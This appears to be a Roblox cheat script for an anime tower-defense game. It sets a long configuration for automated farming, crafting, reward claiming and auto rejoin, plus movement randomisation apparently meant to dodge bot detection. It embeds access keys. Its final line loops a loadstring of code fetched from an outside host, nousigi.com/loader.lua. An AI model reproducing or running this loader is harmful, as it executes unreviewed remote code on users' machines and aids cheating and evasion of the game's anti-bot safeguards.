game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
getgenv().RedeemAllCode = true
getgenv().EquipMacroUnit = true
getgenv().Config = {
	["Joiner Cooldown"] = 0,
	["Performance"] = {
		["Delete Map"] = true,
		["Boost FPS"] = true,
		["Delete Entities"] = true,
		["Black Screen"] = {
			["Enable"] = true
		}	
	},
	["Auto Play"] = {
		["Auto Upgrade"] = true,
		["Place Cap"] = {
			["1"] = 0,
			["3"] = 0,
			["2"] = 0,
			["5"] = 0,
			["4"] = 0,
			["6"] = 0,
		},
		["Enable"] = true,
		["Upgrade Method"] = "Lowest Level (Spread Upgrade)",
		["Prefer Position"] = {
			["Golden Castle"] = "Middle",
			["Double Dungeon"] = "Middle",
			["Planet Namak"] = "Middle",
			["Tracks at the Edge of the World"] = "Middle",
			["Shibuya Station"] = "Middle",
			["Sand Village"] = "Middle",
			["Shibuya Aftermath"] = "Middle",
			["Underground Church"] = "Middle",
			["Spider Forest"] = "Middle"
		},
		["Upgrade Cap"] = {
			["1"] = 0,
			["3"] = 0,
			["2"] = 0,
			["5"] = 0,
			["4"] = 0,
			["6"] = -1
		},
		["Focus on Farm"] = true
	},
	["Match Finished"] = {
		["Auto Replay"] = true
	},
	["Crafter"] = {
		["Teleport Lobby full Essence"] = true,
		["Enable"] = true,
		["Essence Stone"] = {
			["Pink Essence Stone"] = true,
			["Blue Essence Stone"] = true,
			["Red Essence Stone"] = true,
			["Yellow Essence Stone"] = true,
			["Purple Essence Stone"] = true
		},
		["Essence Stone Limit"] = {
			["Pink Essence Stone"] = 30,
			["Blue Essence Stone"] = 30,
			["Red Essence Stone"] = 30,
			["Yellow Essence Stone"] = 30,
			["Purple Essence Stone"] = 30
		}
	},
	["Macros"] = {
		["Macro"] = "",
		["No Ignore Sell Timing"] = true,
		["Ignore Macro Timing"] = true
	},
	["Failsafe"] = {
		["Auto Rejoin"] = true,
		["Teleport Lobby if Player"] = false
	},
	["Secure"] = {
		["Walk Around"] = true,
		["Random Offset"] = true
	},
	["Gold Buyer"] = {
		["Enable"] = false,
		["Item"] = {
			["Crystal"] = true,
			["Blue Essence Stone"] = true,
			["Red Essence Stone"] = true,
			["Yellow Essence Stone"] = true,
			["Purple Essence Stone"] = true,
			["Senzu Bean"] = true,
			["Pink Essence Stone"] = true,
			["Ramen"] = true,
			["Green Essence Stone"] = true,
			["Rainbow Essence Stone"] = true,
			["Super Stat Chip"] = true,
			["Stat Chip"] = true
		}
	},
	["Legend Stage Joiner"] = {
		["Stage"] = "Shibuya Aftermath",
		["Auto Join"] = true,
		["Act"] = "Act2"
	},
	["AutoSave"] = true,
	["Claimer"] = {
		["Auto Claim Battle Pass"] = true,
		["Auto Claim Quest"] = true,
		["Auto Claim Achievement"] = true,
		["Auto Claim Daily Reward"] = true,
		["Auto Claim Collection"] = true,
		["Auto Claim Enemy Index"] = true,
		["Auto Claim Milestone"] = true
	},
	["Gameplay"] = {
		["Auto Skip Wave"] = true,
		["Auto Use Ability"] = true
	},
	["Performance Failsafe"] = {
		["Ping Freeze"] = true,
		["Teleport Lobby FPS below"] = {
			["Enable"] = true,
			["FPS"] = 4
		}
	}
}
getgenv().Key = "swxqHzWiWRRSVkZqanyraHCEYNggPiBx" -- key main[ElIsfyTzBhioWvdmAjNPUaUaCHtnQvwH , swxqHzWiWRRSVkZqanyraHCEYNggPiBx]
repeat wait(2)spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(2)until Joebiden
